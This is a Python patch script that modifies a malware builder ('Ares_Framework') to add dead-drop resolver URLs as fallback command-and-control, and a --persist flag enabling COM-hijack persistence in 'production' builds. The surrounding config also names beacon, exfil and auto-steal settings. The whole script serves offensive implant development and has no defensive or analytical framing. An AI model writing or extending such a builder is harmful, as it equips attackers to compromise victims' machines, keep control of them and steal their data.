#!/usr/bin/env python3
"""
Patch ares_builder.py:
1. gen_config: add dead_drop_url1/url2 params + inject into config template
2. build flow: pass --dead-drop-1/2 args into gen_config
3. CFG_AUTO_PERSIST default: 1 for production build
"""
import os, re

path = r'C:\Users\Admin\.openclaw\workspace\Ares_Framework\ares_builder.py'
with open(path, 'r', encoding='utf-8', errors='replace') as f:
    content = f.read()

# ── Patch 1: gen_config signature add dead_drop params ──────────────────────
OLD_SIG = 'def gen_config(c2_hosts, c2_port, campaign, xor_key, sleep_ms, jitter,\n               kill_days, auto_persist, auto_steal, use_https):'
NEW_SIG = 'def gen_config(c2_hosts, c2_port, campaign, xor_key, sleep_ms, jitter,\n               kill_days, auto_persist, auto_steal, use_https,\n               dead_drop_url1="", dead_drop_url2=""):'
content = content.replace(OLD_SIG, NEW_SIG, 1)

# ── Patch 2: inject dead drop defines into cfg template ──────────────────────
OLD_CFG_END = '#define CFG_USE_HTTP          {0 if use_https else 1}'
NEW_CFG_END = (
    '#define CFG_USE_HTTP          {0 if use_https else 1}\n'
    '\n'
    '/* --- Dead Drop Resolver (fallback C2 if primary CF Worker down) --- */\n'
    '#define CFG_DEAD_DROP_ENABLED       {1 if (dead_drop_url1 or dead_drop_url2) else 0}\n'
    '#define CFG_DEAD_DROP_URL_1         "{dead_drop_url1}"\n'
    '#define CFG_DEAD_DROP_URL_2         "{dead_drop_url2}"\n'
    '#define CFG_DEAD_DROP_MARKER_START  "{{{{"\n'
    '#define CFG_DEAD_DROP_MARKER_END    "}}}}"'
)
content = content.replace(OLD_CFG_END, NEW_CFG_END, 1)

# ── Patch 3: where gen_config is called, pass dead_drop args ─────────────────
OLD_CALL = 'cfg, path_register, path_beacon, path_result, path_exfil = gen_config('
# Find the call and add dead_drop args after the last positional arg
# The call is multi-line, so find end of it and patch
idx = content.find(OLD_CALL)
if idx != -1:
    # Find closing paren of this call
    paren_start = content.find('(', idx)
    depth = 0
    for i in range(paren_start, len(content)):
        if content[i] == '(':
            depth += 1
        elif content[i] == ')':
            depth -= 1
            if depth == 0:
                # Insert dead_drop args before closing paren
                old_call_end = content[idx:i+1]
                new_call_end = content[idx:i] + \
                    ',\n               dead_drop_url1=getattr(args, "dead_drop_1", ""),' \
                    '\n               dead_drop_url2=getattr(args, "dead_drop_2", ""))' 
                content = content[:idx] + new_call_end + content[i+1:]
                break

# ── Patch 4: CFG_AUTO_PERSIST = 1 for production build ───────────────────────
# In compile_production source list: CFG_AUTO_PERSIST is in gen_config; just default to 1
# The auto_persist param is passed from args.persist; add --persist flag
OLD_PERSIST_HELP = "parser.add_argument('--dead-drop-1'"
NEW_PERSIST_HELP = ("parser.add_argument('--persist', action='store_true', "
                    "help='Enable auto-persistence (COM hijack) in production build')\n"
                    "    parser.add_argument('--dead-drop-1'")
content = content.replace(OLD_PERSIST_HELP, NEW_PERSIST_HELP, 1)

with open(path, 'w', encoding='utf-8') as f:
    f.write(content)

print(f'ares_builder.py patched: {os.path.getsize(path)} bytes')
print('Changes:')
print('  [+] gen_config: dead_drop_url1/url2 params')
print('  [+] config template: CFG_DEAD_DROP_ENABLED/URL_1/URL_2 injected')
print('  [+] gen_config call: passes args.dead_drop_1 / args.dead_drop_2')
print('  [+] --persist flag added to builder CLI')
